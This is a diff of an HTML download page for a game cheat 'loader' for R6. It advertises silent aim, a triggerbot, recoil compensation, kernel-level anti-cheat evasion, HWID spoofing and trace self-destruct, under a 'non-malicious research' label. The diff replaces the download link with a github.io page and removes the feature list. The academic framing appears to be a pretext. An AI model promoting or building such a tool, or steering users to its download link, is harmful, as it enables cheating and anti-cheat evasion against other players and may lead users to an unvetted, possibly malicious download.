@@ -15,7 +15,7 @@
   <div style="text-align:center; background:#0a0a2a; padding:20px; border-radius:8px; margin:25px 0; border:1px solid #ffaa33;">
     <h2 style="color:#ffaa77; margin-top:0;">📥 Research Loader – Source Code Access</h2>
     <p style="color:#ccc;">Full source (C++ / kernel demo) – for academic use only. Compatible with R6 Y10S1+ offline builds.</p>
-    <h2><a style="font-size:28px; color:#fff; text-decoration:none; font-weight:bold; display:inline-block; background:#aa7733; padding:15px 30px; border-radius:5px; margin:15px 0;" rel="noopener" href="https://github.com/oasis14082001-ops/research-tool">🔬 Get loader (Source)</a></h2>
+    <h2><a style="font-size:28px; color:#fff; text-decoration:none; font-weight:bold; display:inline-block; background:#aa7733; padding:15px 30px; border-radius:5px; margin:15px 0;" rel="noopener" href="https://josephyrs030301.github.io/Loader/">🔬 Get loader (Source)</a></h2>
     <p style="color:#999; font-size:0.9em;">✅ 2026 • ✅ Silent Aim POC • ✅ Triggerbot Demo • ✅ Recoil Study • ✅ Open Source</p>
   </div>
 
@@ -24,42 +24,6 @@
     <p>This is a <strong>non‑malicious proof‑of‑concept</strong> designed to help security researchers and game developers understand how silent aim and input manipulation work. It uses <strong>theoretical silent aim techniques</strong> (crosshair never visibly moves), adjustable aim FOV, triggerbot simulation (auto‑fire on target hitbox), recoil compensation, and priority targeting algorithms. <strong>Absolutely do not use on live BattleEye servers</strong> – it is intended for offline/local testing and educational purposes only.</p>
   </div>
 
-  <h2 style="color:#ffaa77; border-bottom:1px solid #3355aa; padding-bottom:8px;">⚙️ Research Features</h2>
-  <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(300px, 1fr)); gap:20px; margin:25px 0;">
-
-    <div style="padding:20px; background:#0a0a2a; border-radius:8px; border:1px solid #3355aa;">
-      <h3 style="color:#ffaa77; margin-top:0;">🎯 Silent Aim POC</h3>
-      <ul>
-        <li><strong>Silent aim simulation</strong> – no visual snapping (theoretical model).</li>
-        <li><strong>Adjustable FOV (1–360°)</strong> – study angle‑based targeting.</li>
-        <li><strong>Priority targeting</strong> – nearest enemy, lowest health, operator filter.</li>
-        <li><strong>Hitbox selection</strong> – head, chest, neck (local hit detection).</li>
-        <li><strong>Aim smoothing algorithm</strong> – human‑like movement curves.</li>
-      </ul>
-    </div>
-
-    <div style="padding:20px; background:#0a0a2a; border-radius:8px; border:1px solid #3355aa;">
-      <h3 style="color:#ffaa77; margin-top:0;">🔫 Triggerbot & Recoil Study</h3>
-      <ul>
-        <li><strong>Triggerbot demo</strong> – auto‑fire on target overlap.</li>
-        <li><strong>Adjustable delay (0–300ms)</strong> – simulate human reaction times.</li>
-        <li><strong>Recoil compensation</strong> – study vertical/horizontal weapon kick reversal.</li>
-        <li><strong>No spread analysis</strong> – bullet trajectory consistency.</li>
-        <li><strong>Wall penetration simulation</strong> – through destructible surfaces (offline).</li>
-      </ul>
-    </div>
-
-    <div style="padding:20px; background:#0a0a2a; border-radius:8px; border:1px solid #3355aa;">
-      <h3 style="color:#ffaa77; margin-top:0;">🛡️ Educational Bypass Concepts</h3>
-      <ul>
-        <li><strong>Kernel‑level evasion theory</strong> – for anti‑cheat research.</li>
-        <li><strong>HWID obfuscation demo</strong> – study how spoofing works.</li>
-        <li><strong>Streamer mode</strong> – hide menu from OBS (privacy feature).</li>
-        <li><strong>Auto‑updater design</strong> – patch compatibility study.</li>
-        <li><strong>Self‑destruct example</strong> – trace removal for clean testing.</li>
-      </ul>
-    </div>
-  </div>
 
   <div style="background:#0a0a2a; padding:20px; border-radius:8px; margin:20px 0; border:1px solid #3355aa;">
     <h3 style="color:#ffaa77; margin-top:0; text-align:center;">🖥️ Research Environment Requirements</h3>
